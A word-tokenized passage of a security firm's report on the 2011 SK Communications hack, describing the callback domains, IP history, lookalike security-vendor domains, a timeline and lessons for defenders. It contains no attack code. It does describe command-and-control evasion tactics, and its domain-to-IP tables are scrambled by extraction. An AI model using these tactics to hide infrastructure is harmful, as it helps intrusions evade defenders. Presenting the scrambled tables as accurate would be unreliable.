"pointed", "to", "the", "South", "Korean", "IP", "address", "121.78.237.135", "but", "at", "the", "time", "of", "writing", "points", "to", "local", "loopback", "IP", "address", "127.0.0.139", "."], ["Attackers", "quite", "commonly", "point", "a", "callback", "domain", "to", "a", "local", "loopback", "IP", "address", "when", "they", "do", "not", "have", "any", "instructions", "for", "the", "infected", "computers", "using", "that", "domain", "."], ["This", "prevents", "the", "computers", "from", "unnecessarily", "contacting", "the", "attacker", "\u2019s", "command", "and", "control", "infrastructure", "."], ["Attackers", "also", "quite", "commonly", "point", "a", "callback", "domain", "to", "a", "local", "loopback", "IP", "address", "when", "they", "want", "to", "protect", "their", "command", "and", "control", "infrastructure", "from", "detection", "."], ["At", "the", "time", "of", "the", "attack", ",", "the", "callback", "domain", "\u2018", "ro.diggfunny.com", "\u2019", "pointed", "to", "the", "South", "Korean", "IP", "address", "116.127.121.109", "."], ["This", "IP", "address", "is", "in", "the", "same", "IP", "address", "range", "(", "116.127.0.0/16", ")", "40", "as", "the", "IP", "address", "used", "by", "the", "ALTools", "related", "command", "and", "control", "server", "(", "IP", "address", "116.127.121.41", ")", "."], ["The", "IP", "37", "Different", "versions", "of", "a", "legitimate", "file", "named", "'", "nateon.exe", "'", "exist", "."], ["These", "files", "are", "associated", "with", "the", "NATEON", "Upgrader", "developed", "by", "SK", "Communications", "."], ["(", "Mister", "Group", "n.d", ".", ")"], ["38", "DNS", "is", "fundamental", "on", "the", "Internet", "."], ["It", "is", "a", "form", "of", "directory", "assistance", "to", "help", "computers", "communicate", "with", "other", "computers", "."], ["Its", "use", "is", "analogous", "to", "a", "person", "calling", "directory", "assistance", "to", "find", "out", "what", "phone", "number", "to", "dial", "to", "speak", "to", "a", "certain", "person", "."], ["39", "A", "local", "loopback", "IP", "address", "is", "an", "address", "which", "is", "not", "Internet", "or", "Intranet", "routable", ",", "ie", "."], ["it", "can", "not", "be", "used", "by", "a", "computer", "to", "communicate", "with", "another", "computer", "."], ["When", "a", "computer", "attempts", "to", "communicate", "with", "a", "local", "loopback", "IP", "address", ",", "it", "communicates", "with", "itself", "."], ["40"], ["The", "IP", "address", "range", "116.127.0.0/16", "is", "the", "Classless", "Inter\u00ad"], ["Domain", "Routing", "(", "CIDR", ")", "representation", "of", "IP", "addresses", "116.127.0.0", "through", "116.127.255.255", "."], ["PAGE", "7", "OF", "24"], ["COPYRIGHT", "\u00a9", "COMMAND", "FIVE", "PTY", "LTD", "."], ["ALL", "RIGHTS", "RESERVED", "."], ["address", "range", "is", "allocated", "to", "the", "South", "Korean", "ISP"], ["Hanaro", "Telecom", "."], ["A", "portion", "of", "the", "IP", "address", "range", "appears", "to", "have", "been", "assigned", "by", "Hanaro", "Telecom", "to", "a", "South", "Korean", "web", "hosting", "company", "."], ["It", "is", "not", "known", "whether", "the", "two", "IP", "addresses", "used", "by", "the", "attackers", "fall", "within", "the", "range", "used", "by", "the", "webhosting", "company", "."], ["It", "is", "also", "unconfirmed", "whether", "that", "company", "is", "based", "in", "Nonhyeong", "\u00ad", "the", "geographic", "region", "of", "the", "company", "that", "hosted", "the", "waypoint", "used", "in", "the", "attack", "."], ["If", "the", "IP", "addresses", "used", "by", "the", "attackers", "in", "the", "range", "116.127.121.0/24", "were", "assigned", "to", "the", "web", "hosting", "company", ",", "it", "is", "possible", "the", "attackers", "purchased", "webhosting", "services", "through", "the", "company", "to", "host", "their", "command", "and", "control", "servers", "instead", "of", "compromising", "legitimate", "servers", "."], ["Other", "IP", "addresses", "in", "the", "range", "are", "also", "associated", "with", "malware41", "but", "that", "malware", "may", "not", "be", "related", "in", "any", "way", "to", "the", "SK", "Communications", "hack", "or", "the", "attackers", "involved", "in", "the", "hack", "."], ["In", "late", "July", "2011", ",", "at", "around", "the", "time", "of", "the", "attack", ",", "the", "callback", "domain", "\u2018", "update.alyac.org", "\u2019", "pointed", "to", "the", "South", "Korean", "IP", "address", "202.30.224.240", "."], ["As", "at", "the", "time", "of", "writing", ",", "the", "domain", "now", "points", "to", "the", "legitimate", "Google", "IP", "address", "8.8.8.8", "."], ["This", "is", "not", "an", "indication", "that", "the", "Google", "IP", "address", "is", "compromised", ",", "and", "the", "Google", "IP", "address", "is", "unlikely", "to", "be", "compromised", "."], ["The", "Google", "IP", "address", "is", "likely", "only", "used", "to", "indicate", "that", "the", "attacker", "has", "no", "instructions", "for", "the", "malware", "or", "to", "instruct", "the", "malware", "to", "continue", "with", "pre\u00adprogrammed", "behaviour", "."], ["The", "malware", "likely", "has", "logic", "built", "in", "which", "prevents", "it", "from", "communicating", "with", "the", "Google", "IP", "address", "."], ["Use", "of", "the", "Google", "IP", "address", "would", "likely", "achieve", "the", "attacker", "\u2019s", "desired", "outcome", "in", "a", "similar", "way", "to", "use", "of", "a", "local", "loopback", "IP", "address", "."], ["It", "would", ",", "however", ",", "be", "less", "likely", "to", "flag", "the", "activity", "to", "network", "defenders", "42", "."], ["It", "is", "also", "possible", "the", "Google", "IP", "address", "is", "used", "to", "channel", "covert", "communications", "to", "the", "command", "41"], ["The", "command", "and", "control", "servers", "of", "dozens", "of", "pieces", "of", "malware", "have", "used", "IP", "addresses", "within", "the", "IP", "address", "range", "116.127.121.0/24", "."], ["(", "Malc0de.com", "n.d", ".", ")"], ["42", "Use", "of", "legitimate", "IP", "addresses", "in", "combination", "with", "preprogramed", "logic", "to", "prevent", "a", "communication", "with", "command", "and", "control", "infrastructure", "is", "a", "much", "less", "common", "indicator", "of", "malicious", "activity", "than", "use", "of", "a", "local", "loopback", "IP", "address", "for", "the", "same", "purpose", "."], ["and", "control", "server", "over", "the", "DNS", "protocol", "43", ",", "in", "effect", ",", "using", "Google", "as", "a", "voluntary", "waypoint", "without", "actually", "compromising", "Google", "\u2019s", "infrastructure", "."], ["Each", "of", "the", "three", "callback", "domains", "has", "a", "Time\u00ad"], ["To\u00adLive", "(", "TTL", ")"], ["44", "of", "30", "minutes", ",", "allowing", "the", "attackers", "to", "rapidly", "change", "the", "command", "and", "control", "server", "pointed", "to", "by", "the", "callback", "domain", "."], ["Registration", "Information"], ["The", "domain", "\u2018", "duamlive.com", "\u2019", "was", "registered", "on", "21"], ["May", "2011", "."], ["It", "was", "registered", "by", "a", "\u2018", "Guangming", "Wang", "\u2019", "."], ["There", "is", "a", "large", "number", "of", "domain", "registrations", "(", "approximately", "400", ")", "associated", "with", "\u2018", "Guangming", "Wang", "\u2019", ",", "possibly", "indicating", "that", "the", "domains", "were", "registered", "by", "an", "intermediary", "."], ["The", "domain", "\u2018", "alyac.org", "\u2019", "was", "registered", "on", "24", "September", "2010", "."], ["The", "domain", "registration", "information", "is", "almost", "identical", "to", "that", "of", "the", "legitimate", "ESTsoft", "domain", "\u2018", "alyac.com", "\u2019", "."], ["The", "domain", "is", "not", ",", "however", ",", "associated", "with", "the", "ALYac", "antivirus", "software", "and", "does", "not", "appear", "to", "be", "associated", "with", "ESTsoft", "at", "all", "."], ["The", "title", "of", "the", "website", "previously", "hosted", "at", "\u2018", "alyac.org", "\u2019", "was", "associated", "with", "finance", ",", "insurance", "and", "cell", "phones", "and", "not", "antivirus", "software45", "."], ["At", "the", "time", "of", "writing", ",", "the", "malicious", "domain", "\u2018", "alyac.org", "\u2019", "points", "to", "the", "Google", "IP", "address", "8.8.8.8", "but", "previously", "pointed", "to", "South", "Korean", "IP", "address", "222.122.20.241", "."], ["Other", "probable", "malicious", "domains", "following", "a", "similar", "pattern", "to", "\u2018", "alyac.org", "\u2019", "(", "whereby", "they", "disguise", "themselves", "as", "being", "associated", "with", "legitimate", "software", "companies", ")", "have", "also", "pointed", "to", "the", "same", "South", "Korean", "IP", "address", "."], ["These", "include", "the", "domains", "\u2018", "trendmicros.net", "\u2019", ",", "\u2018", "nprotects.org", "\u2019", "and", "\u2018", "bomuls.com", "\u2019", "."], ["The", "domain", "\u2018", "trendmicros.net", "\u2019", "was", "purportedly", "registered", "by"], ["Trend", "Micro", "Inc."], ["The", "registration", "details", "are", "almost", "identical", "to", "that", "of", "the", "legitimate", "domain", "\u2018", "trendmicro.com", "\u2019", "."], ["The", "domain", ",", "however", ",", "appears", "to", "have", "nothing", "to", "do", "with", "the", "security", "company", "."], ["The", "malicious", "domain", "\u2018", "nprotects.org", "\u2019", "is", "similar", "to", "that", "of", "the", "legitimate", "security", "company"], ["43"], ["The", "malware", "could", "use", "a", "similar", "technique", "to", "software", "such", "as", "iodine", "."], ["(", "Kryo", ",", "2010", ")"], ["44"], ["The", "TTL", "of", "a", "domain", "in", "a", "DNS", "record", "refers", "to", "the", "duration", "for", "which", "the", "DNS", "result", "can", "be", "cached", "."], ["45"], ["A", "webpage", "previously", "hosted", "at", "'", "alyac.org", "'", "had", "a", "title", "of", "'", "Cash", "Advance", "|", "Debt", "Consolidation", "|", "Insurance", "|", "Free", "Credit", "Report", "|"], ["Cell", "Phones", "at", "alyac.org", "\u2019", "."], ["(", "Domain", "Tools", ",", "LLC", ",", "2011", ")", "PAGE", "8", "OF", "24"], ["COPYRIGHT"], ["\u00a9", "COMMAND", "FIVE", "PTY", "LTD", "."], ["ALL", "RIGHTS", "RESERVED", "."], ["nProtect", "(", "\u2018", "nprotect.com", "\u2019", ")", "but", "again", ",", "does", "not", "appear", "to", "be", "associated", "with", "the", "company", "."], ["The", "domain", "has", "previously", "been", "associated", "with", "malware", "known", "as", "\u2018", "Trojan", "."], ["Win32.Generic", "\u2019", "46", "."], ["Similarly", "the", "domain", "\u2018", "bomuls.com", "\u2019", "is", "not", "dissimilar", "to", "that", "of", "the", "legitimate", "software", "company", "whose", "website", "resides", "at", "\u2018", "bomul.com", "\u2019", "."], ["(", "ETnews", ",", "2011", ")"], ["The", "domains", "referenced", "above", "are", "summarised", "in", "Table", "1", "."], ["DOMAIN", "SUBDOMAIN", "IP", "ADDRESS(ES", ")", "DUAMLIVE.COM", "\u00ad", "127.0.0.1", "*", "NATEON", "."], ["121.78.237.135", "(", "KR", ")"], ["127.0.0.1", "*", "FR", ".", "121.78.237.135", "(", "KR", ")"], ["127.0.0.1", "*", "\u00ad", "222.122.20.241", "(", "KR", ")"], ["8.8.8.8", "(", "US", ")", "*", "UPDATE", "."], ["202.30.224.240", "(", "KR", ")"], ["8.8.8.8", "(", "US", ")", "*", "PATH", "."], ["8.8.8.8"], ["(", "US", ")", "*", "WWW", "."], ["8.8.8.8"], ["(", "US", ")", "*", "\u00ad", "222.122.20.241", "(", "KR", ")", "*", "FILE1", "."], ["222.122.20.241", "(", "KR", ")", "*", "PC", "."], ["220.90.209.157"], ["(", "KR", ")"], ["222.122.20.241", "(", "KR", ")", "*", "\u00ad", "222.122.20.241", "(", "KR", ")", "*", "DOWNLOAD", "."], ["222.122.20.241", "(", "KR", ")", "*", "BBS", "."], ["222.122.20.241", "(", "KR", ")", "*", "\u00ad", "66.249.89.104", "(", "US", ")"], ["222.122.20.241", "(", "KR", ")"], ["98.126.8.230", "(", "US", ")", "*", "DOWNLOAD", "."], ["222.122.20.241", "(", "KR", ")", "*", "FORUM", "."], ["222.122.20.241", "(", "KR", ")", "*", "ALYAC.ORG", "NPROTECTS.ORG"], ["TRENDMICROS.NET", "BOMULS.COM", "The", "domain", "\u2018", "diggfunny.com", "\u2019", "was", "registered", "on", "14", "April", "2011", "by", "a", "\u2018", "Lee", "Cooper", "\u2019", "."], ["The", "same", "registrant", "details", "were", "used", "to", "register", "several", "other", "domains", "."], ["These", "domains", "include", "\u2018", "edsplan.com", "\u2019", ",", "\u2018", "ezxsoft.com", "\u2018", ",", "\u2018", "finalcover.com", "\u2019", ",", "\u2018", "mindplat.com", "\u2019", ",", "\u2018", "projectxz.com", "\u2019", ",", "and", "\u2018", "soucesp.com", "\u2019", "\u00ad", "all", "of", "which", "were", "registered", "on", "14", "April", "2011", "."], ["The", "domains", "\u2018", "daumfan.com", "\u2019", "and", "\u2018", "natefan.com", "\u2019", "were", "also", "registered", "by", "\u2018", "Lee", "Cooper", "\u2019", ","], ["but", "on", "25", "July", "2011", ",", "the", "day", "before", "the", "hacking", "operation", "against", "the", "Nate", "and", "CyWorld", "user", "databases", "."], ["The", "same", "registrant", "details", "were", "purportedly", "used", "to", "register", "an", "additional", "seven", "domains", "."], ["Each", "of", "these", "domains", "has", "a", "TTL", "of", "30", "minutes", "."], ["(", "Domain", "Tools", ",", "LLC", ",", "2011", ")"], ["At", "the", "time", "of", "writing", "none", "of", "the", "above", "domains", "registered", "by", "\u2018", "Lee", "Cooper", "\u2019", "point", "to", "a", "malicious", "IP", "address", "."], ["The", "domain", "\u2018", "natefan.com", "\u2019", "points", "to", "the", "Google", "IP", "address", "8.8.8.8", ",", "\u2018", "daumfan.com", "\u2019", "points", "to", "the", "Enom", "Inc", "47", "IP", "address", "8.5.1.42", ",", "\u2018", "finalcover.com", "\u2019", "points", "to", "the", "private", "IP", "address", "192.168.10.132", "and", "none", "of", "\u2018", "diggfunny.com", "\u2019", ",", "\u2018", "ezxsoft.com", "\u2019", ",", "\u2018", "edsplan.com", "\u2019", ",", "\u2018", "mindplat.com", "\u2019", ",", "\u2018", "projectxz.com", "\u2019", "or", "\u2018", "soucesp.com", "\u2019", "currently", "point", "to", "an", "IP", "address", "."], ["This", "suggests", "the", "domains", "are", "not", "currently", "in", "use", ",", "however", ",", "at", "least", "one", "subdomain", "appears", "to", "be", "in", "current", "use", "as", "shown", "in", "Table", "2", "."], ["*"], ["Indicates", "IP", "address", "assigned", "at", "time", "of", "writing", "."], ["TABLE", "1", "\u00ad", "SUMMARY", "OF", "REFERENCED", "DOMAINS", "46", "Malware", "detected", "as", "\u2018", "Trojan", "."], ["Win32.Generic", "\u2019", "in", "May", "2011", "used", "the", "callback", "domain", "\u2018", "pc.nprotects.org", "\u2019", "."], ["(", "GFI", "SandBox", ",", "2011", ")"], ["47", "Enom", "Inc", "is", "a", "legitimate", "domain", "name", "registrar", "used", "by", "the", "attackers", "to", "register", "domain", "names", "and", "also", "to", "host", "webpages", "."], ["PAGE", "9", "OF", "24"], ["COPYRIGHT", "\u00a9", "COMMAND", "FIVE", "PTY", "LTD", "."], ["ALL", "RIGHTS", "RESERVED", "."], ["DOMAIN", "SUBDOMAIN"], ["IP", "ADDRESS(ES", ")", "DAUMFAN.COM", "\u00ad", "8.5.1.8", "(", "US", ")"], ["8.5.1.42", "(", "US", ")", "*", "WWW", "."], ["8.5.1.8", "(", "US", ")"], ["8.5.1.42", "(", "US", ")", "*", "\u00ad", "8.8.8.8", "(", "US", ")", "RO", "."], ["116.127.121.109", "(", "KR", ")", "WWW", "."], ["8.8.8.8"], ["(", "US", ")"], ["61.19.250.219(TH", ")", "\u00ad", "64.74.223.10", "(", "US", ")", "ITT", "."], ["127.0.0.1", "*", "DIGGFUNNY.COM", "EDSPLAN.COM", "EZXSOFT.COM", "Cash", "Advance", "|", "Debt", "Consolidation", "|", "Insurance", "|", "Free", "Credit", "Report", "|", "Cell", "Phones", "@", "domain", "Meta", "Description"], ["Find", "Cash", "Advance", ",", "Debt", "Consolidation", "and", "more", "at", "domain", "."], ["Get", "the", "best", "of", "Insurance", "or", "Free", "Credit", "Report", ",", "browse", "our", "section", "on", "Cell", "Phones", "or", "learn", "about", "Life", "Insurance", "."], ["Domain", "is", "the", "site", "for", "Cash", "Advance", "."], ["FIGURE", "3", "\u00ad", "EXAMPLE", "OF", "WEBPAGE", "TEMPLATE", "USED", "\u00ad", "BBS", "."], ["202.30.224.240", "(", "KR", ")"], ["8.8.8.8"], ["*", "(", "US", ")", "\u00ad", "192.168.10.132", "*", "I.", "69.197.132.132", "(", "US", ")"], ["127.0.0.1", "*", "T.", "218.213.229.69", "(", "HK", ")"], ["218.213.229.68", "(", "HK", ")", "*", "\u00ad", "64.74.223.48", "(", "US", ")", "CACHE", "."], ["8.8.8.8"], ["(", "US", ")", "*", "NATEFAN.COM", "\u00ad", "8.8.8.8", "(", "US", ")", "*", "PROJECTXZ.COM", "\u00ad", "8.5.1.11", "(", "US", ")", "ITT", "."], ["202.181.170.67", "(", "HK", ")"], ["8.8.8.8", "(", "US", ")", "*", "\u00ad", "61.82.71.30", "(", "KR", ")"], ["127.0.0.1", "FINALCOVER.COM", "MINDPLAT.COM", "SOUCESP.COM"], ["Title", "*", "Indicates", "IP", "address", "assigned", "at", "time", "of", "writing", "."], ["TABLE", "2", "\u00ad", "DOMAINS", "REGISTERED", "BY", "LEE", "COOPER", "Several", "of", "the", "domains", "registered", "by", "\u2018", "Lee", "Cooper", "\u2019", "previously", "pointed", "to", "webpages", "."], ["The", "domain", "\u2018", "mindplat.com", "\u2019", "previously", "pointed", "to", "an", "Enom", "Inc.", "server", "which", "hosted", "its", "webpage", "."], ["The", "title", "and", "meta", "description", "of", "the", "\u2018", "mindplat.com", "\u2019", "website", "is", "almost", "identical", "to", "that", "of", "the", "\u2018", "alyac.org", "\u2019", "website", "."], ["Both", "websites", "follow", "the", "template", "shown", "in", "Figure", "3", "."], ["The", "same", "template", "has", "also", "been", "used", "for", "several", "other", "webpages", "and", "may", "merely", "be", "a", "template", "provided", "by", "a", "service", "provider", "used", "by", "the", "registrants", "."], ["The", "domains", "\u2018", "natefan.com", "\u2019", "and", "\u2018", "projectxz.com", "\u2019", "also", "previously", "pointed", "to", "webpages", "."], ["The", "webpages", "were", "similar", "to", "the", "\u2018", "mindplat.com", "\u2019", "and", "\u2018", "alyac.org", "\u2019", "webpages", "but", "with", "different", "text", "."], ["Again", ",", "these", "webpages", "use", "the", "same", "template", "as", "other", "webpages", "and", "may", "merely", "be", "provided", "by", "a", "service", "provider", "."], ["The", "presence", "of", "these", "webpages", "may", "indicate", "an", "attempt", "by", "the", "attackers", "to", "make", "the", "malicious", "domains", "appear", "more", "legitimate", ".", "SIMILARITIES", "TO", "OTHER", "MALWARE"], ["As", "previously", "discussed", ",", "the", "domain", "\u2018", "ro.diggfunny.com", "\u2019", "is", "associated", "with", "malicious", "activity", "."], ["The", "domains", "\u2018", "cache.mindplat.com", "\u2019", "and", "\u2018", "bbs.ezxsoft.com", "\u2019", "are", "also", "known", "to", "be", "associated", "with", "malware", "."], ["The", "first", "is", "listed", "as", "a", "malicious", "domain48", "and", "the", "second", "was", "used", "as", "a", "callback", "domain", "by", "malware", "known", "as", "49", "."], ["The", "domain", "\u2018", "Trojan", ".", "Win32.AgentBypass", "\u2019", "\u2018", "bbs.ezxsoft.com", "\u2019", "also", "previously", "pointed", "to", "the", "same", "South", "Korean", "IP", "address", "as", "\u2018", "update.alyac.org", "\u2019"], ["(", "IP", "address", "202.30.224.240", ")", ",", "further", "linking", "it", "to", "the", "attackers", "responsible", "for", "the", "hack", "into", "SK", "Communications", "."], ["Even", "if", "ignoring", "the", "connection", "they", "both", "have", "to", "the", "domain", "\u2018", "alyac.org", "\u2019", ",", "the", "two", "pieces", "of", "malware", "named", "\u2018", "Trojan", ".", "Win32.Generic", "\u2019", "and", "\u2018", "Trojan", ".", "Win32.AgentBypass", "\u2019", "respectively", "(", "earlier", "referenced", ")", "are", "still", "linked", "."], ["Both", "pieces", "of", "malware", "create", "a", "uniquely", "named", "directory", "50", ",", "as", "do", "at", "least", "three", "other", "pieces", "of", "malware", "(", "summarised", "in", "Annex", "B", ")", "."], ["This", "further", "links", "the", "domains", "\u2018", "nprotects.org", "\u2019", "and", "\u2018", "ezxsoft.com", "\u2019", ",", "and", "suggests", "this", "malware", ",", "along", "with", "the", "callback", "domains", ",", "may", "be", "part", "of", "a", "broader", ",", "concerted", "effort", "by", "the", "same", "attackers", "."], ["The", "domain", "'", "cache.mindplat.com", "'", "is", "listed", "alongside", "'"], ["ro.diggfunny.com", "'", "in", "a", "list", "of", "malicious", "web", "addresses", "."], ["(", "CEOinIRVINE", "2011", ")", "."], ["49"], ["Malware", "detected", "as", "'", "Trojan", "."], ["Win32.AgentBypass", "'", "in", "mid", "July", "2011", "used", "the", "callback", "domain", "'", "bbs.ezxsoft.com", "'", "."], ["(", "GFI", "SandBox", "2011", ")"], ["50", "Malware", "analysis", "reports", "indicate", "both", "pieces", "of", "malware", "create", "a", "directory", "named", "\u2018", "03a075fb70d5d675f9dc26fc", "\u2019", "inside", "the", "system", "directory", "and", "a", "subdirectory", "named", "\u2018", "update", "\u2019", "."], ["(", "GFI", "SandBox", "2011", ")", "(", "GFI", "SandBox", ",", "2011", ")", "48", "PAGE", "10", "OF", "24"], ["COPYRIGHT", "\u00a9", "COMMAND", "FIVE", "PTY", "LTD", "."], ["ALL", "RIGHTS", "RESERVED", "."], ["TIMELINE", "24", "September", "2010"], ["The", "domain", "'", "alyac.org", "'", "is", "registered", "."], ["INSIGHTS", "\ufffd", "\ufffd", "27", "September", "2010"], ["The", "Destory", "RAT", "is", "compiled", "."], ["\ufffd"], ["14", "April", "2011"], ["The", "domain", "'", "diggfunny.com", "'", "is", "registered", "along", "with", "other", "domains", "."], ["\ufffd", "21", "May", "2011"], ["The", "domain", "'", "duamlive.com", "'", "is", "registered", "."], ["18", "July", "2011"], ["On", "or", "prior", "to", "this", "date", "attackers", "compromise", "the", "ESTSoft", "ALZip", "update", "server", ".", "18\u00ad25", "July", "2011"], ["Numerous", "SK", "Communications", "computers", "become", "infected", "during", "routine", "ALZip", "software", "updates", "."], ["Attackers", "use", "their", "new", "access", "to", "download", "tools", "and", "prepare", "for", "targeting", "of", "the", "user", "database", "."], ["\ufffd"], ["\ufffd", "25", "July", "2011"], ["The", "domains", "\u2018", "daumfan.com", "\u2019", ",", "and", "'", "natefan.com", "'", "are", "registered", "."], ["\ufffd"], ["26", "\u00ad", "28", "July", "2011"], ["The", "attackers", "use", "\u2018", "nateon.exe", "\u2019", "malware", "and", "the", "callback", "domains", "\u2018", "nateon.duamlive.com", "\u2019", "and", "\u2018", "ro.diggfunny.com", "\u2019", "to", "access", "SK", "Communications", "\u2019", "Nate", "and", "CyWorld", "user", "databases", ",", "stealing", "the", "personal", "details", "of", "up", "to", "35", "million", "users", "."], ["\ufffd", "\ufffd"], ["Attackers", "will", "conduct", "reconnaissance", "on", "their", "targets", "and", "consider", "all", "sorts", "of", "targeting", "options", "(", "both", "direct", "and", "indirect", ")", "."], ["Attackers", "may", "target", "a", "company", "in", "order", "to", "use", "it", "as", "a", "\u2018", "launchpad", "\u2019", "to", "gain", "access", "to", "other", "targets", ",", "as", "demonstrated", "by", "the", "targeting", "of", "ESTsoft", "'s", "ALZip", "update", "server", "."], ["Attackers", "can", "conduct", "selective", "targeting", "\u00ad", "choosing", "which", "computers", "download", "malicious", "content", "and", "which", "do", "not", ",", "as", "they", "appear", "to", "have", "done", "with", "the", "ALZip", "update", "server", "."], ["Even", "though", "two", "computers", "may", "submit", "an", "identical", "request", "for", "a", "file", "(", "or", "webpage", ")", ",", "they", "may", "not", "get", "the", "same", "file", "(", "or", "webpage", ")", "back", "in", "response", "."], ["This", "behaviour", "reduces", "the", "likelihood", "of", "malware", "unintentionally", "going", "viral", "."], ["Unfortunately", "it", "also", "hampers", "investigations", "by", "network", "defenders", "who", "may", "assess", "a", "file", "(", "or", "webpage", ")", "to", "be", "safe", ",", "when", "it", "is", "not", "safe", "to", "all", "users", "."], ["Attackers", "may", "hack", "a", "computer", "for", "the", "sole", "purpose", "of", "using", "it", "as", "a", "\u2018", "waypoint", "\u2019", "or", "as", "an", "intermediary", "location", "from", "where", "they", "can", "store", "and", "access", "their", "tools", "without", "suspicion", "from", "their", "targets", "."], ["This", "appears", "to", "have", "been", "the", "case", "with", "the", "use", "of", "the", "Cite", "Media", "Holding", "Group", "webserver", "and"], ["the", "Nonhyeong", "based", "waypoint", ",", "although", "it", "is", "possible", "they", "were", "initially", "hacked", "for", "another", "reason", "."], ["Attackers", "may", "use", "the", "same", "registration", "information", "to", "register", "multiple", "domain", "names", "."], ["Such", "appears", "to", "have", "been", "the", "case", "with", "the", "domains", "registered", "by", "\u2018", "Lee", "Cooper", "\u2019", "."], ["Attackers", "may", "register", "domains", "containing", "words", "that", "are", "expected", "to", "make", "them", "appear", "less", "suspicious", "to", "targets", "."], ["Such", "as", "with", "the", "use", "of", "\u2018", "nateon'and", "\u2018", "alyac", "\u2019", "in", "the", "callback", "domains", "used", "by", "infected", "SK", "Communications", "computers", "."], ["Attackers", "may", "use", "seemingly", "legitimate", "registration", "information", "to", "register", "domain", "names", "."], ["Such", "appears", "to", "have", "been", "the", "case", "with", "the", "registration", "of", "\u2018", "alyac.org", "\u2019", "and", "\u2018", "trendmicros.net", "\u2019", "."], ["Users", "should", "be", "wary", "of", "domains", "which", "appear", "to", "be", "legitimate", "but", "are", "not", "."], ["Such", "as", "\u2018", "alyac.org", "\u2019", "instead", "of", "\u2018", "alyac.com", "\u2019", ",", "PAGE", "11", "OF", "24"], ["COPYRIGHT"], ["\u00a9", "COMMAND", "FIVE", "PTY", "LTD", "."], ["ALL", "RIGHTS", "RESERVED", "."], ["\ufffd", "\ufffd", "\ufffd"], ["\u2018", "trendmicros.net", "\u2019", "instead", "of", "\u2018", "trendmicro.com", "\u2019", ",", "\u2018", "nprotects.org", "\u2019", "instead", "of", "\u2018", "nprotect.com", "\u2019", "and", "\u2018", "bomuls.com", "\u2019", "instead", "of", "\u2018", "bomul.com", "\u2019", "."], ["Even", "though", "it", "is", "relatively", "easy", "to", "create", "new", "infrastructure", ",", "attackers", "sometimes", "reuse", "infrastructure", "."], ["For", "example", ",", "the", "domains", "\u2018", "bbs.ezxsoft.com", "\u2019", "and", "\u2018", "update.alyac.org", "\u2019", "both", "previously", "pointed", "to", "IP", "address", "202.30.244.240", ",", "and", "\u2018", "alyac.org", "\u2019", ",", "\u2018", "trendmicros.net", "\u2019", ",", "\u2018", "nprotect.org", "\u2019", "and", "\u2018", "bomuls.com", "\u2019", "all", "pointed", "to", "IP", "address", "222.122.20.241", "."], ["The", "TTL", "of", "domains", "(", "in", "DNS", "records", ")", "controlled", "by", "attackers", "are", "often", "set", "to", "low", "values", "(", "such", "as", "30", "minutes", ")", "allowing", "the", "attackers", "to", "rapidly", "change", "the", "command", "and", "control", "server", "pointed", "to", "by", "a", "callback", "domain", "."], ["This", "facilitates", "relatively", "uninterrupted", "access", "to", "a", "target", "when", "command", "and", "control", "infrastructure", "becomes", "blocked", "or", "is", "otherwise", "unavailable", "."], ["The", "use", "of", "legitimate", "domains", "for", "malicious", "purposes", ",", "familiar", "words", "in", "domain", "names", "and", "of", "non\u00admalicious", "IP", "addresses", "in", "DNS", "records", "for", "malicious", "domains", ",", "can", "make", "detection", "of", "malicious", "activity", "more", "difficult", "and", "cause", "network", "defenders", "to", "dismiss", "malicious", "activity", "(", "in", "network", "/", "system", "logs", "or", "Intrusion", "Detection", "System", "alerts", ",", "in", "particular", ")", "as", "legitimate", "."], ["\ufffd"], ["\ufffd", "\ufffd", "\ufffd"], ["Adding", "malicious", "IP", "addresses", "and", "domains", "to", "blacklists", "can", "help", "prevent", "malicious", "activity", ",", "however", ",", "attackers", "can", "respond", "by", "merely", "using", "alternate", "infrastructure", "and/or", "callback", "domains", "."], ["Domains", "and", "IP", "addresses", "may", "have", "legitimate", "purposes", "too", "and", "blacklisting", "them", "may", "also", "block", "legitimate", "business", "."], ["Blacklists", "should", "be", "reviewed", "periodically", "to", "ensure", "they", "are", "not", "blocking", "legitimate", "business", "unnecessarily", "."], ["Whitelists", "are", "generally", "much", "more", "effective", "than", "blacklists", ",", "however", ",", "even", "whitelists", "can", "allow", "malicious", "activity", "to", "occur", "to", "legitimate", "sites", "that", "have", "been", "compromised", "."], ["For", "example", ",", "as", "a", "good", "security", "practice", ",", "most", "system", "administrators", "would", "have", "allowed", "access", "to", "the", "ALZip", "update", "server", "if", "they", "had", "ALZip", "software", "installed", "on", "their", "network", "."], ["Similarly", ",", "if", "a", "whitelist", "were", "employed", "on", "the", "targeted", "network", "but", "users", "had", "a", "legitimate", "need", "to", "access", "the", "website", "of", "the", "Taiwanese", "publishing", "company", ",", "the", "attacker", "would", "likely", "still", "have", "been", "able", "to", "access", "their", "toolbox", "."], ["Users", "and", "network", "administrators", "need", "to", "continually", "reassess", "who", "and", "what", "they", "trust", "on", "the", "Internet", "given", "that", "trust", "relationships", "can", "be", ",", "and", "increasingly", "are", ",", "exploited", "for", "malicious", "purposes", "."], ["DISCLAIMER", "Machine", "translation", "software", "has", "been", "heavily", "relied", "on", "throughout", "the", "development", "of", "this", "paper", "."], ["While", "data", "has", "been", "verified", "against", "multiple", "sources", ",", "where", "possible", ",", "Command", "Five", "Pty", "Ltd", "does", "not", "guarantee", "the", "veracity", "of", "sources", "or", "the", "accuracy", "of", "translation", "and", "interpretation", "."], ["Command", "Five", "Pty", "Ltd", "reminds", "readers", "to", "exercise", "caution", "when", "visiting", "untrusted", "websites", "and/or", "opening", "untrusted", "digital", "documents", "."], ["Command", "Five", "Pty", "Ltd", "does", "not", "warrant", "that", "the", "websites", "referenced", "in", "this", "paper", "are", "trustworthy", "."], ["PAGE", "12", "OF", "24"], ["COPYRIGHT", "\u00a9", "COMMAND", "FIVE", "PTY", "LTD", "."], ["ALL", "RIGHTS", "RESERVED", "."], ["REFERENCES", "Birdman", "."], ["(", "2011", ",", "July", "31", ")", "."], ["Xecure", "Lab", "Blog", "."], ["Retrieved", "August", "12", ",", "2011", ",", "from", "http://blog.xecure\u00ad", "lab.com/2011/07/2500.html", "CEOinIRVINE", "."], ["(", "2011", ",", "August", "17", ")", "."], ["Information", "Security", "&", "US", "&", "Life", "&", "Love", "&", "Fashion", "&", "Hacking", "&", "Passion", "."], ["Retrieved", "September", "13", ",", "2011", ",", "from", "http://hack3r.tistory.com/tag/Malware", "Command", "Five", "Pty", "Ltd.", "(", "2011", ",", "June", ")", "."], ["Advanced", "Persistent", "Threats", ":", "A", "Decade", "in", "Review", "."], ["Retrieved", "September", "24", ",", "2011", ",", "from", "Command", 